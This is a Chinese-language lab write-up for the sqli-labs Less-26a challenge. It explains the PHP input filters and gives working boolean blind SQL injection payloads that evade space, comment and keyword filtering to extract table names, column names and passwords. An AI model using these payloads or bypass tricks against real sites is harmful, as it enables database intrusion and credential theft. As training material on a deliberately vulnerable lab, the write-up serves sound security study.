# Less-26a （空格注释全禁+括号闭合+盲注）

## 查看分析源码

过滤和 Less-26 一模一样：

```php
$id= preg_replace('/or/i',"", $id);        // 去掉 or
$id= preg_replace('/and/i',"", $id);       // 去掉 and
$id= preg_replace('/[\/\*]/',"", $id);     // 去掉 /*
$id= preg_replace('/[--]/',"", $id);       // 去掉 --
$id= preg_replace('/[#]/',"", $id);        // 去掉 #
$id= preg_replace('/[\s]/',"", $id);       // 去掉空格 Tab 换行（两次）
$id= preg_replace('/[\s]/',"", $id);
$id= preg_replace('/[\/\\]/',"", $id);    // 去掉 / 和 \
```

多了两个差异：
1. 括号闭合 `id=('$id')` → 用 `')` 闭合
2. `print_r(mysql_error())` 被注释了，没报错

没报错 → updatexml 不起作用 → 只能用布尔盲注。

空格 `\s` 全禁 → 用 () 包裹替代。or → `||` 或双写。and → `%26%26`。
`LIMIT(0,1)` 带两个括号参数不行 → 用 `group_concat` 全取出来，`substr` 定位。

## 布尔盲注基础

```
?id=1')&&(1)&&('1     ← 返回数据
?id=1')&&(0)&&('1     ← 不返回
```

`&&(条件)&&('1` — 条件真就出数据，假就不出。末尾 `('1` 始终真，开头 `id=1` 也恒真，所以中间条件决定结果。

## 判断库名长度

```
?id=1')&&((select(length(database())))=8)&&('1
```

## 爆库名

```
?id=1')&&((select(substr(database(),1,1)))='s')&&('1
?id=1')&&((select(substr(database(),2,1)))='e')&&('1
```

## 爆表名

`infoorrmation_schema` 的 or 双写：

```
?id=1')&&((select(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1)))='e')&&('1
```

全表名：`emails,referers,uagents,users`

```
?id=1')&&((select(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),25,1)))='u')&&('1
```

## 爆列名

```
?id=1')&&((select(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())%26%26(table_name='users')),1,1)))='i')&&('1
```

## 爆数据

password 的 or 双写 `passwoorrd`：

```
?id=1')&&((select(substr((select(group_concat(passwoorrd))from(users)),1,1)))='D')&&('1
```

具体字符用二分法爆更快：

```
?id=1')&&(ascii(substr((select(group_concat(passwoorrd))from(users)),1,1))>65)&&('1
```

注意用 `ascii` 不能用 `ord`——`ord` 里有 `or`，会被过滤掉变成 `d`。

返回数据 → >65，不返回 → ≤65，折半逼近。手工太慢直接跑 `sqli-26a-blind.py`：

```bash
cd D:\obsidian\security-notes\03_Topics\靶场项目\sqli-labs
python sqli-26a-blind.py
```

全链路自动爆完（库名→表名→列名→数据），约 2 分钟。

![2000](99_Attachments/图片/Less-26a/file-20260615193437663.png)
![2000](99_Attachments/图片/Less-26a/file-20260615193449700.png)